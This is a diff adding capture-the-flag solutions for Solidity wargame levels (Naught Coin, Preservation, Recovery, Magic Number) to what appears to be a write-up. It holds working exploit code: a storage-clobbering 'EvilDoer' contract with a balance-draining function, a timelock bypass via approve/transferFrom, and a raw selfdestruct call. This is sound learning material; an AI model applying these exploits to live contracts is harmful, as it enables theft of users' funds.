@@ -353,3 +353,159 @@ contract Enterer {
 
 </details> 
 
+<details>
+    <summary>👌 Level 15 - Naught coin</summary>
+
+The timelock only applies to `transfer`, not `transferFrom` so we need to go with `approve` -> `transferFrom`
+
+```solidity
+> balance = (await contract.balanceOf(player)).toString()
+"1000000000000000000000000"
+
+> await contract.approve(player, '1000000000000000000000000')
+> await contract.transferFrom(player, '0x...', '1000000000000000000000000')
+
+> balance = (await contract.balanceOf(player)).toString()
+"0"
+```
+
+</details> 
+
+<details>
+    <summary>⏰ Level 16 - Preservation</summary>
+
+Deploy this first:
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
+
+contract EvilDoer {
+    address public timeZone1Library;
+    address public timeZone2Library;
+    address public owner;
+
+    function setTime(uint _time) public {
+        timeZone1Library = address(this);
+        timeZone2Library = address(this);
+        owner = tx.origin;
+    }
+
+    function drain() public {
+        payable(msg.sender).transfer(address(this).balance);
+    }
+}
+```
+
+```javascript
+// then run this to stomp the address of timeZone1Library with evildoer
+await contract.setFirstTime(evildoer);
+
+// then let evildoer stomp the owner
+await contract.setFirstTime(42);
+```
+
+</details> 
+
+<details>
+    <summary>⛑️ Level 17 - Recovery</summary>
+Use etherscan to find the address the 0.5 ether was sent to.
+
+```javascript
+// getting the function selector:
+web3.eth.abi.encodeFunctionSignature('destroy(address)')
+"0x00f55d9d"
+
+// getting the whole function invocation, including the selector:
+web3.eth.abi.encodeFunctionCall({
+   name: 'destroy',
+   type: 'function',
+   inputs: [{
+       type: 'address',
+       name: '_to'
+   }]
+}, [player]);
+
+"0x00f55d9d000000000000000000000000....."
+
+// making a low level call to self destruct it:
+web3.eth.sendTransaction({from: player, to: tokenContract, data: "0x00f55d9d000000000000000000000000...."})
+```
+
+</details> 
+
+<details>
+    <summary>🧙‍♂️ Level 18 - Magic number</summary>
+
+Let's make the tiniest solver in Yul:
+
+```yul
+// Solver.yul
+object "Solver" {
+    code {
+        mstore(0x20, 42)
+        return(0x20, 32)
+    }
+}
+```
+
+Build it:
+
+```
+> solc --strict-assembly Solver.yul
+
+Warning: Yul is still experimental. Please use the output with care.
+
+======= Solver.yul (EVM) =======
+
+Pretty printed source:
+object "Solver" {
+    code {
+        mstore(0x20, 42)
+        return(0x20, 32)
+    }
+}
+
+
+Binary representation:
+602a60205260206020f3
+
+Text representation:
+    /* "Solver.yul":50:52   */
+  0x2a
+    /* "Solver.yul":44:48   */
+  0x20
+    /* "Solver.yul":37:53   */
+  mstore
+    /* "Solver.yul":75:77   */
+  0x20
+    /* "Solver.yul":69:73   */
+  0x20
+    /* "Solver.yul":62:78   */
+  return
+```
+
+Take note of the binary representation. We want to deploy that, which is a bit tricky because we need to send a transaction to address 0 not with this code directly, but with code that returns this binary representation. I took the opportunity to learn about deployment code by writing a [raw_deployer](https://github.com/karmacoma-eth/yolo-evm#raw_deployerpy) script:
+
+``` shell
+> python raw_deployer.py 602a60205260206020f3       
+600a8061000d6000396000f3fe602a60205260206020f3
+```
+
+Now we got the init code, we can create the contract:
+
+```javascript
+web3.eth.sendTransaction({
+    from: player, 
+/* no to address as we are creating a contract */ 
+    data: "600a8061000d6000396000f3fe602a60205260206020f3"
+})
+```
+
+Now just set the solver on the contract and we're done:
+
+```javascript
+await contract.setSolver('0x...')
+```
+
+</details> 
